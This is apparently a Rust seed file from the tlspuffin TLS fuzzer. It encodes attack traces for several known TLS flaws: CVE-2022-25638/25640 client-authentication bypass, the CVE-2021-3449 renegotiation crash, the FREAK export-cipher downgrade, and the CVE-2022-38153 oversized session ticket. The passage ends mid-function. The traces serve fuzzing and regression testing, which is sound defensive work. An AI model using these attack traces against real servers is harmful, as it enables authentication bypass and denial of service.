#![allow(dead_code)]

use puffin::agent::{AgentDescriptor, AgentName};
use puffin::algebra::dynamic_function::TypeShape;
use puffin::trace::{Action, InputAction, OutputAction, Step, Trace};
use puffin::{input_action, term};

use crate::protocol::{
    AgentType, MessageFlight, TLSDescriptorConfig, TLSProtocolTypes, TLSVersion,
};
use crate::query::TlsQueryMatcher;
use crate::tls::fn_impl::*;
use crate::tls::rustls::key::{
    fn_certificate, fn_list_certificate_append, fn_list_certificate_empty,
};
use crate::tls::rustls::msgs::base::*;
use crate::tls::rustls::msgs::ccs::fn_changecipherspecpayload;
use crate::tls::rustls::msgs::enums::{HandshakeType, *};
use crate::tls::rustls::msgs::handshake::{fn_compressions, *};
use crate::tls::rustls::msgs::message::{OpaqueMessage, *};
use crate::tls::seeds::*;

/// <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25638>
pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_clienthello,
                    fn_handshakepayload_clienthello(
                        fn_clienthellopayload(
                            fn_protocolversion_tlsv1_2,
                            fn_random,
                            fn_sessionid,
                            (fn_ciphersuites(
                                (fn_list_ciphersuite_append(
                                    (fn_list_ciphersuite_empty()),
                                    fn_ciphersuite_tls13_aes_128_gcm_sha256
                                ))
                            )),
                            fn_compressions(
                                fn_list_compression_append(
                                    fn_list_compression_empty,
                                    fn_compression_null
                                )
                            ),
                            (fn_clientextensions(
                                (fn_list_clientextension_append(
                                    (fn_list_clientextension_append(
                                        (fn_list_clientextension_append(
                                            (fn_list_clientextension_append(
                                                fn_list_clientextension_empty,
                                                (fn_clientextension_namedgroups(
                                                    fn_namedgroups(
                                                        (fn_list_namedgroup_append(
                                                            fn_list_namedgroup_empty,
                                                            fn_namedgroup_secp384r1
                                                        ))
                                                    )
                                                ))
                                            )),
                                            (fn_clientextension_signaturealgorithms(
                                                fn_supportedsignatureschemes(
                                                    (fn_list_signaturescheme_append(
                                                        (fn_list_signaturescheme_append(
                                                            fn_list_signaturescheme_empty,
                                                            fn_signaturescheme_rsa_pkcs1_sha256
                                                        )),
                                                        fn_signaturescheme_rsa_pss_sha256
                                                    ))
                                                )
                                            ))
                                        )),
                                        (fn_clientextension_keyshare(
                                            fn_keyshareentries(
                                                (fn_list_keyshareentry_append(
                                                    fn_list_keyshareentry_empty,
                                                    (fn_key_share_deterministic(
                                                        fn_namedgroup_secp384r1
                                                    ))
                                                ))
                                            )
                                        ))
                                    )),
                                    fn_clientextension_supportedversions(
                                        fn_protocolversions(
                                            fn_list_protocolversion_append(
                                                fn_list_protocolversion_empty,
                                                fn_protocolversion_tlsv1_3
                                            )
                                        )
                                    )
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    let decrypted_handshake = term! {
        fn_decrypt_handshake_flight(
            ((server, 0)/MessageFlight),
            // The first flight of messages sent by the server
            (fn_server_hello_transcript(((server, 0)))),
            (fn_psk(
                D(
                    ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))] / KeyShareEntry),
                    Vec<u8>
                )
            )),
            fn_no_psk,
            fn_namedgroup_secp384r1,
            fn_true,
            fn_seq_0,
            // sequence 0
            fn_random,
            fn_ciphersuite_tls13_aes_128_gcm_sha256
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        D(
            (@decrypted_handshake),
            [Some(TlsQueryMatcher::Handshake(Some(HandshakeType::CertificateRequest)))] / Message
        )
    };

    let certificate_rsa = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_certificate,
                    fn_handshakepayload_certificatetls13(
                        fn_certificatepayloadtls13(
                            (fn_payloadu8((D((@certificate_request_message), Vec<u8>)))),
                            //fn_list_certificateentry_empty
                            // Or append eve cert
                            (fn_certificateentries(
                                (fn_list_certificateentry_append(
                                    fn_list_certificateentry_empty,
                                    (fn_certificateentry(
                                        fn_certificate(fn_eve_cert),
                                        (fn_certificateextensions(fn_list_certificateextension_empty))
                                    ))
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    let certificate_verify_rsa = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_certificateverify,
                    fn_handshakepayload_certificateverify(
                        fn_digitallysignedstruct(
                            fn_invalid_signature_algorithm,
                            // Option 1 (something random, only possible because of fn_list_certificateentry_empty, if FAIL_IF_NO_PEER_CERT is unset):
                            //fn_eve_cert // or fn_empty_bytes_vec
                            // Option 2 (impersonating eve, you have to send eve cert):
                            (fn_payloadu16(fn_eve_pkcs1_signature))
                        )
                    )
                )
            )
        )
    };

    let client_finished = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_finished,
                    fn_handshakepayload_finished(
                        fn_payload(
                            (fn_verify_data(
                                (fn_server_finished_transcript(((server, 0)))),
                                (fn_server_hello_transcript(((server, 0)))),
                                (fn_psk(D(((server, 0) / KeyShareEntry), Vec<u8>))),
                                fn_no_psk,
                                fn_namedgroup_secp384r1,
                                fn_random,
                                fn_ciphersuite_tls13_aes_128_gcm_sha256
                            ))
                        )
                    )
                )
            )
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            TLSDescriptorConfig {
                tls_version: TLSVersion::V1_3,
                typ: AgentType::Server,
                client_authentication: true,
                ..TLSDescriptorConfig::default()
            },
        )],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    @client_hello
                }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_encrypt_handshake(
                        (@certificate_rsa),
                        (fn_server_hello_transcript(((server, 0)))),
                        (fn_psk(D(((server, 0) / KeyShareEntry), Vec<u8>))),
                        fn_no_psk,
                        fn_namedgroup_secp384r1,
                        fn_true,
                        fn_seq_0,
                        // sequence 0
                        fn_random,
                        fn_ciphersuite_tls13_aes_128_gcm_sha256
                    )
                }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_encrypt_handshake(
                        (@certificate_verify_rsa),
                        (fn_server_hello_transcript(((server, 0)))),
                        (fn_psk(D(((server, 0) / KeyShareEntry), Vec<u8>))),
                        fn_no_psk,
                        fn_namedgroup_secp384r1,
                        fn_true,
                        fn_seq_1,
                        // sequence 1
                        fn_random,
                        fn_ciphersuite_tls13_aes_128_gcm_sha256
                    )
                }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_encrypt_handshake(
                        (@client_finished),
                        (fn_server_hello_transcript(((server, 0)))),
                        (fn_psk(D(((server, 0) / KeyShareEntry), Vec<u8>))),
                        fn_no_psk,
                        fn_namedgroup_secp384r1,
                        fn_true,
                        fn_seq_2,
                        // sequence 2
                        fn_random,
                        fn_ciphersuite_tls13_aes_128_gcm_sha256
                    )
                }
                }),
            },
        ],
        ..Default::default()
    }
}

/// <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25640>
pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_clienthello,
                    fn_handshakepayload_clienthello(
                        fn_clienthellopayload(
                            fn_protocolversion_tlsv1_2,
                            fn_random,
                            fn_sessionid,
                            (fn_ciphersuites(
                                (fn_list_ciphersuite_append(
                                    (fn_list_ciphersuite_empty()),
                                    fn_ciphersuite_tls13_aes_128_gcm_sha256
                                ))
                            )),
                            fn_compressions(
                                fn_list_compression_append(
                                    fn_list_compression_empty,
                                    fn_compression_null
                                )
                            ),
                            (fn_clientextensions(
                                (fn_list_clientextension_append(
                                    (fn_list_clientextension_append(
                                        (fn_list_clientextension_append(
                                            (fn_list_clientextension_append(
                                                fn_list_clientextension_empty,
                                                (fn_clientextension_namedgroups(
                                                    fn_namedgroups(
                                                        (fn_list_namedgroup_append(
                                                            fn_list_namedgroup_empty,
                                                            fn_namedgroup_secp384r1
                                                        ))
                                                    )
                                                ))
                                            )),
                                            (fn_clientextension_signaturealgorithms(
                                                fn_supportedsignatureschemes(
                                                    (fn_list_signaturescheme_append(
                                                        (fn_list_signaturescheme_append(
                                                            fn_list_signaturescheme_empty,
                                                            fn_signaturescheme_rsa_pkcs1_sha256
                                                        )),
                                                        fn_signaturescheme_rsa_pss_sha256
                                                    ))
                                                )
                                            ))
                                        )),
                                        (fn_clientextension_keyshare(
                                            fn_keyshareentries(
                                                (fn_list_keyshareentry_append(
                                                    fn_list_keyshareentry_empty,
                                                    (fn_key_share_deterministic(
                                                        fn_namedgroup_secp384r1
                                                    ))
                                                ))
                                            )
                                        ))
                                    )),
                                    fn_clientextension_supportedversions(
                                        fn_protocolversions(
                                            fn_list_protocolversion_append(
                                                fn_list_protocolversion_empty,
                                                fn_protocolversion_tlsv1_3
                                            )
                                        )
                                    )
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    let decrypted_handshake = term! {
        fn_decrypt_handshake_flight(
            ((server, 0)/MessageFlight),
            // The first flight of messages sent by the server
            (fn_server_hello_transcript(((server, 0)))),
            (fn_psk(
                D(
                    ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))] / KeyShareEntry),
                    Vec<u8>
                )
            )),
            fn_no_psk,
            fn_namedgroup_secp384r1,
            fn_true,
            fn_seq_0,
            // sequence 0
            fn_random,
            fn_ciphersuite_tls13_aes_128_gcm_sha256
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        D(
            (@decrypted_handshake),
            [Some(TlsQueryMatcher::Handshake(Some(HandshakeType::CertificateRequest)))] / Message
        )
    };

    let certificate = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_certificate,
                    fn_handshakepayload_certificatetls13(
                        fn_certificatepayloadtls13(
                            (fn_payloadu8((D((@certificate_request_message), Vec<u8>)))),
                            (fn_certificateentries(
                                (fn_list_certificateentry_append(
                                    fn_list_certificateentry_empty,
                                    (fn_certificateentry(
                                        fn_certificate(fn_eve_cert),
                                        (fn_certificateextensions(fn_list_certificateextension_empty))
                                    ))
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    let client_finished = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_finished,
                    fn_handshakepayload_finished(
                        fn_payload(
                            (fn_verify_data(
                                (fn_certificate_transcript(((server, 0)))),
                                (fn_server_hello_transcript(((server, 0)))),
                                (fn_psk(D(((server, 0) / KeyShareEntry), Vec<u8>))),
                                fn_no_psk,
                                fn_namedgroup_secp384r1,
                                fn_random,
                                fn_ciphersuite_tls13_aes_128_gcm_sha256
                            ))
                        )
                    )
                )
            )
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            TLSDescriptorConfig {
                tls_version: TLSVersion::V1_3,
                typ: AgentType::Server,
                client_authentication: true,
                ..TLSDescriptorConfig::default()
            },
        )],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    @client_hello
                }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_encrypt_handshake(
                        (@certificate),
                        (fn_server_hello_transcript(((server, 0)))),
                        (fn_psk(D(((server, 0) / KeyShareEntry), Vec<u8>))),
                        fn_no_psk,
                        fn_namedgroup_secp384r1,
                        fn_true,
                        fn_seq_0,
                        // sequence 0
                        fn_random,
                        fn_ciphersuite_tls13_aes_128_gcm_sha256
                    )
                }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_encrypt_handshake(
                        (@client_finished),
                        (fn_server_hello_transcript(((server, 0)))),
                        (fn_psk(D(((server, 0) / KeyShareEntry), Vec<u8>))),
                        fn_no_psk,
                        fn_namedgroup_secp384r1,
                        fn_true,
                        fn_seq_1,
                        // sequence 1
                        fn_random,
                        fn_ciphersuite_tls13_aes_128_gcm_sha256
                    )
                }
                }),
            },
        ],
        ..Default::default()
    }
}

/// <https://nvd.nist.gov/vuln/detail/cve-2021-3449>
pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TLSProtocolTypes> {
    let (mut trace, client_verify_data) = _seed_client_attacker12(server);

    let renegotiation_client_hello = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_clienthello,
                    fn_handshakepayload_clienthello(
                        fn_clienthellopayload(
                            fn_protocolversion_tlsv1_2,
                            fn_random,
                            fn_sessionid,
                            (fn_ciphersuites(
                                (fn_list_ciphersuite_append(
                                    (fn_list_ciphersuite_empty()),
                                    // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                                    fn_ciphersuite_tls_ecdhe_rsa_with_aes_128_gcm_sha256
                                ))
                            )),
                            fn_compressions(
                                fn_list_compression_append(
                                    fn_list_compression_empty,
                                    fn_compression_null
                                )
                            ),
                            (fn_clientextensions(
                                (fn_list_clientextension_append(
                                    (fn_list_clientextension_append(
                                        (fn_list_clientextension_append(
                                            (fn_list_clientextension_append(
                                                (fn_list_clientextension_append(
                                                    fn_list_clientextension_empty,
                                                    (fn_clientextension_namedgroups(
                                                        fn_namedgroups(
                                                            (fn_list_namedgroup_append(
                                                                fn_list_namedgroup_empty,
                                                                fn_namedgroup_secp384r1
                                                            ))
                                                        )
                                                    ))
                                                )),
                                                fn_clientextension_ecpointformats(
                                                    fn_ecpointformatlist(
                                                        fn_list_ecpointformat_append(
                                                            fn_list_ecpointformat_empty,
                                                            fn_ecpointformat_uncompressed
                                                        )
                                                    )
                                                )
                                            )),
                                            fn_clientextension_signedcertificatetimestamprequest
                                        )),
                                        // Enable Renegotiation
                                        (fn_clientextension_renegotiationinfo(
                                            (fn_payloadu8((@client_verify_data)))
                                        ))
                                    )),
                                    // Add signature cert extension
                                    fn_signature_algorithm_cert_extension
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    trace.steps.push(Step {
        agent: server,
        action: Action::Input(input_action! { term! {
            fn_encrypt12(
                (@renegotiation_client_hello),
                ((server, 0)),
                (fn_decode_server_ecdh_pubkey(
                    ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                )),
                fn_namedgroup_secp384r1,
                fn_true,
                fn_seq_1,
                fn_random,
                fn_ciphersuite_tls_ecdhe_rsa_with_aes_128_gcm_sha256
            )
        }
        }),
    });

    /*trace.steps.push(Step {
        agent: server,
        action: Action::Input(input_action! { term! {
            fn_encrypt12(
                renegotiation_client_hello,
                ((server, 0)),
                (fn_decode_server_ecdh_pubkey(
                    ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                )),
                fn_namedgroup_secp384r1,
                fn_true,
                fn_seq_1
            )
        }
        }),
    });*/

    trace
}

// A heartbeat trace that cheats on the payload length is not expressed as a recipe any more:
// bit-level mutations reach the same messages, and `test_seed_bitmut_cve_2022_38153` checks
// that such a trace is still found.

pub fn seed_freak(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_clienthello,
                                fn_handshakepayload_clienthello(
                                    fn_clienthellopayload(
                                        ((client, 0)),
                                        ((client, 0)),
                                        ((client, 0)),
                                        (fn_ciphersuites(
                                            (fn_list_ciphersuite_append(
                                                (fn_list_ciphersuite_empty()),
                                                fn_ciphersuite_tls_rsa_export_with_des40_cbc_sha
                                            ))
                                        )),
                                        ((client, 0)),
                                        ((client, 0))
                                    )
                                )
                            )
                        )
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverhello,
                                fn_handshakepayload_serverhello(
                                    fn_serverhellopayload(
                                        ((server, 0)),
                                        ((server, 0)),
                                        ((server, 0)),
                                        (fn_ciphersuite_tls_rsa_with_aes_256_cbc_sha256),
                                        ((server, 0)),
                                        ((server, 0))
                                    )
                                )
                            )
                        )
                    )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_certificate,
                                fn_handshakepayload_certificate(
                                    fn_certificatepayload(((server, 0)))
                                )
                            )
                        )
                    )
                }
                                }),
            },
            // Server Key Exchange, Server -> Client
            // If the KEX fails here, then no ephemeral KEX is used
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverkeyexchange,
                                fn_handshakepayload_serverkeyexchange(
                                    fn_serverkeyexchangepayload_unknown(
                                        fn_payload(
                                            // check whether the client rejects this if it does not support export
                                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                                        )
                                    )
                                )
                            )
                        )
                    )
                }
                                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverhellodone,
                                fn_handshakepayload_serverhellodone
                            )
                        )
                    )
                }
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_clientkeyexchange,
                                fn_handshakepayload_clientkeyexchange(
                                    fn_payload(
                                        ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                                    )
                                )
                            )
                        )
                    )
                }
                                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_changecipherspec(fn_changecipherspecpayload)
                    )
                }
                }),
            },
        ],
        ..Default::default()
    }
}

/// A simplified version of [`seed_cve_2022_25640`]
pub fn seed_cve_2022_25640_simple(server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_clienthello,
                    fn_handshakepayload_clienthello(
                        fn_clienthellopayload(
                            fn_protocolversion_tlsv1_2,
                            fn_random,
                            fn_sessionid,
                            (fn_ciphersuites(
                                (fn_list_ciphersuite_append(
                                    (fn_list_ciphersuite_empty()),
                                    fn_ciphersuite_tls13_aes_128_gcm_sha256
                                ))
                            )),
                            fn_compressions(
                                fn_list_compression_append(
                                    fn_list_compression_empty,
                                    fn_compression_null
                                )
                            ),
                            (fn_clientextensions(
                                (fn_list_clientextension_append(
                                    (fn_list_clientextension_append(
                                        (fn_list_clientextension_append(
                                            (fn_list_clientextension_append(
                                                fn_list_clientextension_empty,
                                                (fn_clientextension_namedgroups(
                                                    fn_namedgroups(
                                                        (fn_list_namedgroup_append(
                                                            fn_list_namedgroup_empty,
                                                            fn_namedgroup_secp384r1
                                                        ))
                                                    )
                                                ))
                                            )),
                                            (fn_clientextension_signaturealgorithms(
                                                fn_supportedsignatureschemes(
                                                    (fn_list_signaturescheme_append(
                                                        (fn_list_signaturescheme_append(
                                                            fn_list_signaturescheme_empty,
                                                            fn_signaturescheme_rsa_pkcs1_sha256
                                                        )),
                                                        fn_signaturescheme_rsa_pss_sha256
                                                    ))
                                                )
                                            ))
                                        )),
                                        (fn_clientextension_keyshare(
                                            fn_keyshareentries(
                                                (fn_list_keyshareentry_append(
                                                    fn_list_keyshareentry_empty,
                                                    (fn_key_share_deterministic(
                                                        fn_namedgroup_secp384r1
                                                    ))
                                                ))
                                            )
                                        ))
                                    )),
                                    fn_clientextension_supportedversions(
                                        fn_protocolversions(
                                            fn_list_protocolversion_append(
                                                fn_list_protocolversion_empty,
                                                fn_protocolversion_tlsv1_3
                                            )
                                        )
                                    )
                                ))
                            ))
                        )
                    )
                )
            )
        )
    };

    let client_finished = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_finished,
                    fn_handshakepayload_finished(
                        fn_payload(
                            (fn_verify_data(
                                (fn_server_finished_transcript(((server, 0)))),
                                (fn_server_hello_transcript(((server, 0)))),
                                (fn_psk(D(((server, 0) / KeyShareEntry), Vec<u8>))),
                                fn_no_psk,
                                fn_namedgroup_secp384r1,
                                fn_random,
                                fn_ciphersuite_tls13_aes_128_gcm_sha256
                            ))
                        )
                    )
                )
            )
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            TLSDescriptorConfig {
                tls_version: TLSVersion::V1_3,
                typ: AgentType::Server,
                client_authentication: true,
                ..TLSDescriptorConfig::default()
            },
        )],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    @client_hello
                }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_encrypt_handshake(
                        (@client_finished),
                        (fn_server_hello_transcript(((server, 0)))),
                        (fn_psk(D(((server, 0) / KeyShareEntry), Vec<u8>))),
                        fn_no_psk,
                        fn_namedgroup_secp384r1,
                        fn_true,
                        fn_seq_0,
                        // sequence 0
                        fn_random,
                        fn_ciphersuite_tls13_aes_128_gcm_sha256
                    )
                }
                }),
            },
        ],
        ..Default::default()
    }
}

pub fn seed_cve_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_clienthello,
                                fn_handshakepayload_clienthello(
                                    fn_clienthellopayload(
                                        ((client, 0)),
                                        ((client, 0)),
                                        ((client, 0)),
                                        ((client, 0)),
                                        ((client, 0)),
                                        ((client, 0))
                                    )
                                )
                            )
                        )
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverhello,
                                fn_handshakepayload_serverhello(
                                    fn_serverhellopayload(
                                        ((server, 0)),
                                        ((server, 0)),
                                        ((client, 0)),
                                        ((server, 0)),
                                        ((server, 0)),
                                        ((server, 0))
                                    )
                                )
                            )
                        )
                    )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_certificate,
                                fn_handshakepayload_certificate(
                                    fn_certificatepayload(((server, 0)))
                                )
                            )
                        )
                    )
                }
                                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverkeyexchange,
                                fn_handshakepayload_serverkeyexchange(
                                    fn_serverkeyexchangepayload_unknown(
                                        fn_payload(
                                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                                        )
                                    )
                                )
                            )
                        )
                    )
                }
                                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverhellodone,
                                fn_handshakepayload_serverhellodone
                            )
                        )
                    )
                }
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_clientkeyexchange,
                                fn_handshakepayload_clientkeyexchange(
                                    fn_payload(
                                        ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                                    )
                                )
                            )
                        )
                    )
                }
                                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_changecipherspec(fn_changecipherspecpayload)
                    )
                }
                }),
            },
            // Client Handshake Finished, Client -> Server
            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
            // not know that the Handshake record message is encrypted. The parsed message from the
            // could be a HelloRequest if the encrypted data starts with a 0.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                    (client, 3)[None] > TypeShape::of::<OpaqueMessage>()
                }
                }),
            },
            // NewSessionTicket, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_newsessionticket,
                                fn_handshakepayload_newsessionticket(
                                    fn_newsessionticketpayload(
                                        ((server, 0)/u32),
                                        (fn_payloadu16(fn_large_bytes_vec))
                                    )
                                )
                            )
                        )
                    )
                }
                                }),
            },
        ],
        ..Default::default()
    }
}

// Same as seed_cve_2022_38153 without the final fn_large_bytes_vec, to check whether we refind it
// through bit-level mutations
pub fn seed_cve_simple_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
    let new_session_ticket_payload = term! {
        fn_payloadu16(
            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::NewSessionTicket)))]/Vec<u8>)
        )
    };

    let last_term = term! {
        fn_message(
            fn_protocolversion_tlsv1_2,
            fn_messagepayload_handshake(
                fn_handshakemessagepayload(
                    fn_handshaketype_newsessionticket,
                    fn_handshakepayload_newsessionticket(
                        fn_newsessionticketpayload(((server, 0)/u32), (@new_session_ticket_payload))
                    )
                )
            )
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![
            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_clienthello,
                                fn_handshakepayload_clienthello(
                                    fn_clienthellopayload(
                                        ((client, 0)),
                                        ((client, 0)),
                                        ((client, 0)),
                                        ((client, 0)),
                                        ((client, 0)),
                                        ((client, 0))
                                    )
                                )
                            )
                        )
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverhello,
                                fn_handshakepayload_serverhello(
                                    fn_serverhellopayload(
                                        ((server, 0)),
                                        ((server, 0)),
                                        ((client, 0)),
                                        ((server, 0)),
                                        ((server, 0)),
                                        ((server, 0))
                                    )
                                )
                            )
                        )
                    )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_certificate,
                                fn_handshakepayload_certificate(
                                    fn_certificatepayload(((server, 0)))
                                )
                            )
                        )
                    )
                }
                                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                    fn_message(
                        fn_protocolversion_tlsv1_2,
                        fn_messagepayload_handshake(
                            fn_handshakemessagepayload(
                                fn_handshaketype_serverkeyexchange,
                                fn_handshakepayload_serverkeyexchange(
                                    fn_serverkeyexchangepayload_unknown(
                                        fn_payload(
                                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                                        )
                                    )
                                )
                            )
                        )
                    )
                }
                                }),
            },
